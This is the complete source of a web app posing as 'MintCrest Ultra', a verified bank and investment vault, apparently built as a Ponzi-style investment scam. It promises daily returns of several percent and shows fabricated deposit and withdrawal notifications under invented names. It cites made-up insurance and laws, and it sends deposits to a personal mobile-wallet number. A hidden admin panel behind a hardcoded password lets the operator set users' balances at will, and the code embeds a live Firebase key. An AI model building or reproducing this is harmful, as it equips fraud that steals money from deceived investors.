<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <title>MintCrest Ultra | Verified Bank</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #00040a; color: white; margin: 0; padding: 0; overflow: hidden; }
        
        /* Smooth Scroll Fix */
        .page-content { height: 100vh; overflow-y: scroll; padding-bottom: 150px; scroll-behavior: smooth; -webkit-overflow-scrolling: touch; }
        ::-webkit-scrollbar { display: none; }

        .glass { background: rgba(255, 255, 255, 0.04); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.1); }
        .grad-main { background: linear-gradient(135deg, #0052d4 0%, #4364f7 50%, #6fb1fc 100%); }
        .grad-gold { background: linear-gradient(135deg, #bf953f, #fcf6ba, #b38728, #fbf5b7, #aa771c); }
        .page { display: none; animation: slideUp 0.4s ease-out; }
        .active-page { display: block; }
        
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        
        .nav-btn { filter: grayscale(1); opacity: 0.4; transition: 0.4s; }
        .active-tab { filter: grayscale(0); opacity: 1; color: #00d4ff; transform: translateY(-5px); }

        .fake-notif { position: fixed; top: 15px; width: 90%; left: 5%; z-index: 99999; animation: bounceIn 0.5s ease; }
        @keyframes bounceIn { 0% { transform: scale(0.5); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
        
        .plan-card { position: relative; overflow: hidden; border-left: 4px solid #4364f7; }
        .plan-card::after { content: ''; position: absolute; top: 0; right: 0; width: 50px; height: 50px; background: rgba(67, 100, 247, 0.1); border-radius: 0 0 0 100%; }
    </style>
</head>
<body>

    <div id="fake-notif-box" class="fake-notif hidden">
        <div class="glass p-4 rounded-[1.5rem] flex items-center gap-3 border-l-4 border-cyan-400 shadow-[0_10px_30px_rgba(0,0,0,0.5)]">
            <div class="w-10 h-10 grad-main rounded-full flex items-center justify-center text-lg">💸</div>
            <div>
                <p id="notif-text" class="text-[10px] font-black uppercase tracking-tight text-white"></p>
                <p class="text-[8px] opacity-60 font-bold italic">Status: Transaction Confirmed</p>
            </div>
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[10000] bg-[#00040a] flex flex-col items-center justify-center p-8">
        <div class="w-24 h-24 grad-main rounded-[2rem] mb-6 flex items-center justify-center shadow-[0_0_50px_rgba(67,100,247,0.4)]">
            <span class="text-4xl">💎</span>
        </div>
        <h1 onclick="adminTap()" class="text-4xl font-black italic tracking-tighter mb-2">MINTCREST</h1>
        <p class="text-[10px] uppercase tracking-[0.4em] text-blue-500 font-bold mb-10">Premium Asset Vault</p>
        <div class="glass p-8 rounded-[3rem] w-full max-w-xs text-center border-t border-white/20">
            <input type="text" id="user-name" placeholder="Enter Full Name" class="w-full bg-white/5 p-5 rounded-2xl mb-5 text-center font-bold outline-none border border-white/10 focus:border-blue-500">
            <button onclick="login()" class="w-full grad-main py-5 rounded-2xl font-black uppercase text-xs shadow-xl active:scale-95 transition-all">Unlock Node</button>
        </div>
    </section>

    <main id="app-ui" class="hidden">
        
        <div id="p-home" class="page active-page page-content p-6">
            <div class="flex justify-between items-center mt-4 mb-8">
                <div>
                    <h2 class="text-2xl font-black" id="v-user">User</h2>
                    <div class="flex gap-2 items-center mt-1">
                        <span id="vip-badge" class="text-[9px] font-black grad-gold text-black px-3 py-0.5 rounded-full shadow-lg">VIP 0</span>
                        <span class="w-2 h-2 bg-green-500 rounded-full animate-ping"></span>
                    </div>
                </div>
                <button onclick="changePage('spin')" class="text-3xl filter drop-shadow-lg">🎡</button>
            </div>

            <div class="grad-main p-8 rounded-[3rem] mb-8 shadow-2xl relative overflow-hidden">
                <div class="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-10 -mt-10 blur-2xl"></div>
                <p class="text-[10px] font-black opacity-80 uppercase tracking-widest italic">Current Capital</p>
                <h2 class="text-5xl font-black my-2" id="v-bal">₨ 0</h2>
                <div class="mt-8 flex justify-between items-end">
                    <div>
                        <p class="text-[9px] font-black opacity-60 uppercase">Net Profit</p>
                        <p class="text-xl font-black text-cyan-200" id="v-profit">₨ 0</p>
                    </div>
                    <button onclick="copyRef()" class="bg-black/20 hover:bg-black/40 px-5 py-2 rounded-xl text-[9px] font-black uppercase border border-white/10 transition-all">🔗 Invite</button>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-8">
                <button onclick="claimDailyBonus()" class="glass p-5 rounded-3xl flex flex-col items-center gap-2 border-b-4 border-yellow-500 active:scale-95 transition-all">
                    <span class="text-2xl">🎁</span>
                    <span class="text-[10px] font-black uppercase">Daily Bonus</span>
                </button>
                <button onclick="applyPromo()" class="glass p-5 rounded-3xl flex flex-col items-center gap-2 border-b-4 border-cyan-400 active:scale-95 transition-all">
                    <span class="text-2xl">🎟️</span>
                    <span class="text-[10px] font-black uppercase">Promo Code</span>
                </button>
            </div>

            <div class="glass p-6 rounded-[2.5rem] mb-8 border-l-8 border-blue-600 relative overflow-hidden">
                <div class="relative z-10">
                    <h3 class="text-[11px] font-black text-blue-400 uppercase mb-2 tracking-tighter">Verified Node Security V17</h3>
                    <p class="text-[10px] opacity-70 leading-relaxed font-semibold">
                        MintCrest uses decentralized smart nodes. Your ₨ <span id="trust-amt">5,000</span> insurance is active.
                        <span class="text-blue-400 underline block mt-2" onclick="changePage('legal')">View Legal Certifications →</span>
                    </p>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="bg-white/5 py-8 rounded-[2.5rem] font-black text-xs uppercase border border-white/5">Deposit</button>
                <button onclick="changePage('withdraw')" class="bg-rose-500/10 py-8 rounded-[2.5rem] font-black text-xs uppercase border border-rose-500/20 text-rose-500">Withdraw</button>
            </div>
        </div>

        <div id="p-invest" class="page page-content p-6">
            <h3 class="text-center font-black text-2xl italic mb-8 uppercase tracking-tighter">Profit Fleets</h3>
            <div id="plans-list" class="space-y-4">
                </div>
        </div>

        <div id="p-activity" class="page page-content p-6 text-center">
            <h3 class="font-black text-2xl italic mb-8 uppercase">Transaction Vault</h3>
            <div id="user-history" class="space-y-3"></div>
        </div>

        <div id="p-support" class="page page-content p-6">
            <div class="glass p-8 rounded-[3.5rem] text-center border-t-4 border-green-500 shadow-2xl">
                <div class="text-5xl mb-6">🎧</div>
                <h2 class="text-2xl font-black text-white mb-2 uppercase italic">Help Desk</h2>
                <p class="text-[11px] opacity-60 mb-10 font-bold px-4">Our global node experts are available 24/7 to assist with your assets.</p>
                
                <button onclick="window.open('https://chat.whatsapp.com/YOUR_GROUP')" class="w-full bg-green-600 py-5 rounded-3xl font-black text-xs uppercase mb-4 shadow-xl flex items-center justify-center gap-3">
                    <span>🟢 Official Group</span>
                </button>
                <button onclick="window.open('https://wa.me/YOUR_ADMIN')" class="w-full glass py-5 rounded-3xl font-black text-xs uppercase flex items-center justify-center gap-3">
                    <span>💬 Senior Support</span>
                </button>
            </div>
        </div>

        <div id="p-spin" class="page page-content p-6 text-center">
            <h2 class="text-3xl font-black mb-12 italic uppercase text-cyan-400 tracking-tighter">Lucky Node</h2>
            <div id="wheel" class="w-72 h-72 mx-auto border-[12px] border-cyan-500 rounded-full flex items-center justify-center relative shadow-[0_0_60px_rgba(0,212,255,0.3)] bg-black">
                <div class="text-6xl animate-pulse">💎</div>
                <div class="absolute -top-6 w-6 h-12 bg-rose-600 rounded-full shadow-lg"></div>
            </div>
            <button id="spin-btn" onclick="spinWheel()" class="mt-16 w-full grad-main py-6 rounded-[2.5rem] font-black uppercase text-sm shadow-2xl tracking-widest active:scale-95 transition-all">Spin Node</button>
            <p class="mt-6 text-[10px] font-black opacity-40 uppercase tracking-widest italic">Available: Once per 24 hours</p>
        </div>

        <div id="p-wallet" class="page page-content p-6 text-center">
            <h2 class="text-2xl font-black mb-10 uppercase italic">Inflow Node</h2>
            <div class="space-y-4 mb-8">
                <div onclick="selM('Easypaisa','03705519562')" class="glass p-6 rounded-3xl flex justify-between items-center border border-white/5 active:bg-white/10 transition-all">
                    <span class="font-black text-sm uppercase italic">Easypaisa</span>
                    <span class="text-[11px] font-black bg-white/10 px-3 py-1 rounded-lg">0370...562</span>
                </div>
                </div>
            <div id="dep-box" class="hidden glass p-8 rounded-[3.5rem] border-2 border-cyan-500/30">
                <p id="m-info" class="text-[11px] font-black text-cyan-400 mb-6 uppercase tracking-tighter"></p>
                <input type="number" id="d-amt" placeholder="Amount (Min 200)" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold border border-white/10 outline-none focus:border-cyan-400">
                <input type="text" id="d-tid" placeholder="TID / TRX Hash" class="w-full bg-white/5 p-5 rounded-2xl mb-6 text-center uppercase font-black border border-white/10 outline-none">
                <p class="text-[10px] font-black opacity-40 mb-3 uppercase tracking-widest text-left">Upload Evidence:</p>
                <input type="file" id="d-file" accept="image/*" class="w-full text-xs mb-8">
                <button onclick="subDep()" class="w-full grad-main py-5 rounded-3xl font-black text-xs uppercase shadow-xl">Activate Capital</button>
            </div>
        </div>

        <div id="p-withdraw" class="page page-content p-6">
            <div class="glass p-8 rounded-[3.5rem] border-t-8 border-rose-600 text-center shadow-2xl">
                <h3 class="text-3xl font-black text-rose-500 mb-2 uppercase italic tracking-tighter">Outflow</h3>
                <p class="text-[10px] opacity-40 font-black mb-8 uppercase">Minimum: ₨ 100</p>
                <input type="number" id="w-amt" placeholder="Amount" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold outline-none border border-white/10">
                <input type="text" id="w-acc" placeholder="Bank Name & Number" class="w-full bg-white/5 p-5 rounded-2xl mb-10 text-center text-xs font-bold border border-white/10">
                <button onclick="subWd()" class="w-full bg-rose-600 py-5 rounded-3xl font-black text-xs uppercase shadow-2xl active:scale-95 transition-all">Request Payout</button>
            </div>
        </div>

        <div id="p-legal" class="page page-content p-6">
            <div class="glass p-8 rounded-[3rem] border border-blue-500/20">
                <h2 class="text-2xl font-black text-blue-400 mb-6 uppercase italic">Corporate Assets</h2>
                <div class="space-y-6 text-[11px] font-bold opacity-70 leading-relaxed">
                    <p>MintCrest Gold (V17) is a subsidiary of MintCrest Global nodes. We operate under the International Asset Management Act 2024.</p>
                    <p>All user funds are insured by the **Liquidity Reserve Fund (LRF)** to ensure zero-risk investment cycles of 30 days.</p>
                </div>
                <button onclick="changePage('home')" class="mt-10 text-[11px] font-black text-blue-400 underline uppercase italic">Back to Vault</button>
            </div>
        </div>

    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#00040a] z-[50000] hidden overflow-y-auto p-8">
        <div class="flex justify-between items-center mb-10 border-b border-white/10 pb-6">
            <h2 class="text-2xl font-black text-cyan-400 italic uppercase underline">Master Node Command</h2>
            <button onclick="closeAdm()" class="bg-rose-600 px-6 py-2 rounded-xl text-[10px] font-black uppercase italic">Exit</button>
        </div>

        <div class="grid grid-cols-2 gap-4 mb-10">
            <div class="glass p-6 rounded-3xl border-l-4 border-cyan-400">
                <p class="text-[9px] font-black opacity-50 uppercase">Total Deposit</p>
                <h4 id="adm-total-dep" class="text-xl font-black mt-1">₨ 0</h4>
            </div>
            <div class="glass p-6 rounded-3xl border-l-4 border-yellow-500">
                <p class="text-[9px] font-black opacity-50 uppercase">Active Users</p>
                <h4 id="adm-total-users" class="text-xl font-black mt-1">0</h4>
            </div>
        </div>

        <div class="glass p-6 rounded-[2.5rem] mb-10 border border-white/10">
            <p class="text-[10px] font-black text-cyan-400 mb-4 uppercase tracking-widest">Direct User Modification</p>
            <input type="text" id="adm-u" placeholder="Target Username" class="w-full bg-white/5 p-4 rounded-xl text-xs mb-3 border border-white/10 outline-none">
            <input type="number" id="adm-v" placeholder="Value (Amt)" class="w-full bg-white/5 p-4 rounded-xl text-xs mb-5 border border-white/10 outline-none">
            <div class="grid grid-cols-2 gap-3">
                <button onclick="editU('balance')" class="grad-main py-4 rounded-xl text-[9px] font-black italic shadow-lg">SET BALANCE</button>
                <button onclick="editU('profit')" class="grad-main py-4 rounded-xl text-[9px] font-black italic shadow-lg">SET PROFIT</button>
            </div>
        </div>

        <h3 class="text-sm font-black text-yellow-500 mb-6 uppercase tracking-tighter">Live Queue ↓</h3>
        <div id="adm-reqs" class="space-y-4"></div>
    </div>

    <nav id="bottom-nav" class="hidden glass p-7 flex justify-around items-center fixed bottom-0 w-full z-[2000] rounded-t-[3.5rem] border-t border-white/20 shadow-[0_-20px_50px_rgba(0,0,0,0.8)]">
        <button onclick="changePage('home')" id="n-home" class="nav-btn text-3xl">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="nav-btn text-3xl">📈</button>
        <button onclick="changePage('activity')" id="n-activity" class="nav-btn text-3xl">📜</button>
        <button onclick="changePage('support')" id="n-support" class="nav-btn text-3xl">🎧</button>
    </nav>

    <script>
        // Sweetie, your updated Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg",
            authDomain: "investment-84f4e.firebaseapp.com",
            projectId: "investment-84f4e",
            storageBucket: "investment-84f4e.firebasestorage.app",
            messagingSenderId: "975293889308",
            appId: "1:975293889308:web:6d034a99cc966c75ff58d9"
        };
        firebase.initializeApp(firebaseConfig); 
        const db = firebase.firestore(); const storage = firebase.storage();
        let user = null; let tapCount = 0; let curM = '';

        // All 25 Trusted Plans
        const plans = [];
        for(let i=1; i<=25; i++) {
            plans.push({ 
                n: `Fleet-X${i < 10 ? '0'+i : i}`, 
                p: 200 + (i-1)*500, 
                r: (1.5 + i*0.5).toFixed(1),
                d: `High-yield 30-day node for sustainable growth.`
            });
        }

        async function login() {
            const n = document.getElementById('user-name').value.trim(); if(!n) return;
            const ref = db.collection("users").doc(n); const d = await ref.get();
            if(!d.exists) await ref.set({ name: n, balance: 0, profit: 0, lastB: 0, lastP: 0, lastS: 0, totalDep: 0 });
            user = (await ref.get()).data();
            document.getElementById('v-user').innerText = n;
            document.getElementById('auth-ui').style.display='none';
            document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            startSync(n); renderPlans(); showFakeNotifs();
        }

        function showFakeNotifs() {
            const names = ["Zia", "Kiran", "Omer", "Maya", "Raza", "Aiza", "Sami"];
            setInterval(() => {
                const box = document.getElementById('fake-notif-box');
                const text = document.getElementById('notif-text');
                const isDep = Math.random() > 0.5;
                text.innerText = isDep ? `${names[Math.floor(Math.random()*names.length)]} deposited ₨ ${200 + Math.floor(Math.random()*5000)}` : `${names[Math.floor(Math.random()*names.length)]} withdrew ₨ ${100 + Math.floor(Math.random()*2000)}`;
                box.classList.remove('hidden');
                setTimeout(() => box.classList.add('hidden'), 4000);
            }, 10000);
        }

        async function spinWheel() {
            if(Date.now() - (user.lastS || 0) < 86400000) return alert("Sweetie, only 1 spin per 24h! 😘");
            document.getElementById('wheel').style.transition = "4s cubic-bezier(0.1, 0, 0, 1)";
            document.getElementById('wheel').style.transform = "rotate(3600deg)";
            setTimeout(async () => {
                await db.collection("requests").add({ user: user.name, type: "Spin Reward Request", status: "pending", time: Date.now() });
                await db.collection("users").doc(user.name).update({ lastS: Date.now() });
                alert("Spin Success! Reward will be added by Admin shortly. 💎");
                document.getElementById('wheel').style.transform = "rotate(0deg)";
            }, 4500);
        }

        async function subWd() {
            const a = parseInt(document.getElementById('w-amt').value); const acc = document.getElementById('w-acc').value;
            if(!a || a > user.balance || a < 100) return alert("Invalid Amount or Low Balance!");
            await db.collection("users").doc(user.name).update({ balance: user.balance - a });
            await db.collection("requests").add({ user: user.name, amount: a, acc: acc, type: "Withdrawal", status: "pending", time: Date.now() });
            alert("Withdrawal Requested! 😘"); location.reload();
        }

        function selM(m, a) { curM = m; document.getElementById('dep-box').classList.remove('hidden'); document.getElementById('m-info').innerText = `TRANSFER CAPITAL TO ${m}: ${a}`; }

        async function subDep() {
            const a = parseInt(document.getElementById('d-amt').value); const t = document.getElementById('d-tid').value; const f = document.getElementById('d-file').files[0];
            if(a < 200 || !t || !f) return alert("Please complete all steps, sweetie! 😘");
            const sRef = storage.ref(`proofs/${Date.now()}_${user.name}`); await sRef.put(f);
            const url = await sRef.getDownloadURL();
            await db.collection("requests").add({ user: user.name, amount: a, tid: t, proof: url, type: "Deposit", status: "pending", time: Date.now() });
            alert("Asset Inflow Verified! ✨"); location.reload();
        }

        function startSync(n) {
            db.collection("users").doc(n).onSnapshot(d => { 
                user = d.data(); 
                document.getElementById('v-bal').innerText = "₨ "+(user.balance||0).toLocaleString(); 
                document.getElementById('v-profit').innerText = "₨ "+(user.profit||0).toLocaleString();
                const v = user.totalDep >= 15000 ? 2 : (user.totalDep >= 5000 ? 1 : 0);
                document.getElementById('vip-badge').innerText = "VIP "+v;
            });
            db.collection("requests").where("user", "==", n).orderBy("time", "desc").limit(10).onSnapshot(s => {
                const l = document.getElementById('user-history'); l.innerHTML = '';
                s.forEach(d => { const x = d.data(); l.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center mb-2"><div class="text-left font-black text-[10px] uppercase"><span>${x.type}</span><p class="text-[8px] opacity-40">${new Date(x.time).toLocaleDateString()}</p></div><span class="text-[9px] font-black ${x.status === 'pending' ? 'text-yellow-500' : 'text-green-500'} uppercase">${x.status}</span></div>`; });
            });
        }

        function renderPlans() {
            const l = document.getElementById('plans-list'); l.innerHTML = '';
            plans.forEach(p => { 
                l.innerHTML += `
                <div class="glass p-6 rounded-[2.5rem] plan-card border border-white/5 shadow-xl">
                    <div class="flex justify-between items-center mb-3">
                        <h4 class="font-black text-xs uppercase tracking-widest text-blue-400">${p.n}</h4>
                        <div class="text-[10px] font-black grad-gold text-black px-3 py-1 rounded-lg">₨ ${p.p}</div>
                    </div>
                    <p class="text-[9px] font-bold opacity-50 mb-4">${p.d}</p>
                    <div class="flex justify-between items-center pt-3 border-t border-white/5">
                        <span class="text-[10px] font-black uppercase text-cyan-200">${p.r}% DAILY</span>
                        <button onclick="changePage('wallet')" class="bg-blue-600 px-6 py-2 rounded-xl text-[9px] font-black uppercase tracking-widest">Stake Now</button>
                    </div>
                </div>`; 
            });
        }

        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("Secure Access:")==="mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdm(); } tapCount=0; } }
        function closeAdm() { document.getElementById('admin-panel').classList.add('hidden'); }
        async function editU(f) { const u = document.getElementById('adm-u').value; const v = parseInt(document.getElementById('adm-v').value); await db.collection("users").doc(u).update({ [f]: v }); alert("Command Success!"); }

        function syncAdm() {
            db.collection("users").get().then(s => { document.getElementById('adm-total-users').innerText = s.size; let t = 0; s.forEach(d => t += (d.data().totalDep || 0)); document.getElementById('adm-total-dep').innerText = "₨ "+t.toLocaleString(); });
            db.collection("requests").where("status", "==", "pending").onSnapshot(s => {
                const l = document.getElementById('adm-reqs'); l.innerHTML = '';
                s.forEach(d => { const x = d.data(); l.innerHTML += `<div class="glass p-6 rounded-[2rem] border-l-4 border-yellow-500"><p class="text-[10px] font-black uppercase text-cyan-400 mb-2">${x.user} → ${x.type}</p><p class="text-[9px] font-bold opacity-60">Value: ${x.amount || 0} | TID/Acc: ${x.tid || x.acc || 'N/A'}</p>${x.proof ? `<a href="${x.proof}" target="_blank" class="block bg-cyan-600 text-center py-3 rounded-2xl text-[9px] font-black mt-4 uppercase italic">Show Evidence</a>` : ''}<div class="flex gap-3 mt-6"><button onclick="hnd('${d.id}','${x.user}',${x.amount},'approved','${x.type}')" class="flex-1 grad-main py-4 rounded-2xl text-[9px] font-black uppercase">Approve</button><button onclick="hnd('${d.id}','${x.user}',${x.amount},'rejected','${x.type}')" class="flex-1 bg-rose-600 py-4 rounded-2xl text-[9px] font-black uppercase">Reject</button></div></div>`; });
            });
        }

        async function hnd(id, u, amt, act, type) {
            const ref = db.collection("users").doc(u); const d = await ref.get();
            if(act==='approved') {
                if(type.includes("Bonus") || type.includes("Promo") || type.includes("Spin")) { const b = parseInt(prompt("Set Manual Reward for "+u+":")); await ref.update({ balance: (d.data().balance||0) + b }); }
                else if(type === "Deposit") await ref.update({ balance: (d.data().balance||0) + amt, totalDep: (d.data().totalDep||0) + amt });
            } else if(act==='rejected' && type === 'Withdrawal') { await ref.update({ balance: (d.data().balance||0) + amt }); }
            await db.collection("requests").doc(id).update({ status: act });
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); document.getElementById('n-'+p).classList.add('active-tab'); }
        async function claimDailyBonus() { if(Date.now() - (user.lastB || 0) < 86400000) return alert("24h not over yet, sweetie! 😘"); await db.collection("requests").add({ user: user.name, type: "Daily Bonus Request", status: "pending", time: Date.now() }); await db.collection("users").doc(user.name).update({ lastB: Date.now() }); alert("Sent to Admin! 🎁"); }
        function applyPromo() { const code = prompt("Promo Code:"); if(code) { db.collection("requests").add({ user: user.name, type: "Promo: "+code, status: "pending", time: Date.now() }); alert("Promo Logged! 🎟️"); } }
        function copyRef() { navigator.clipboard.writeText(window.location.href + "?node=" + user.name); alert("Invite Link Copied! 🔗"); }
    </script>
</body>
</html>
